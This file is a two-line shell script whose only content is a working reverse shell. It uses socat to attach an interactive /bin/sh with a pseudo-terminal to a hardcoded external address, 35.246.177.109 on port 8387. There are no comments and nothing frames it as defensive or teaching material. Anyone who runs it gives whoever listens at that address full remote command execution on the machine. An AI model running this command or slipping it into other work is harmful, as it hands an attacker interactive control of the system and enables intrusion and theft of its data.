#!/bin/sh
socat exec:'/bin/sh',pty,stderr,setsid,sigint,sane tcp:35.246.177.109:8387
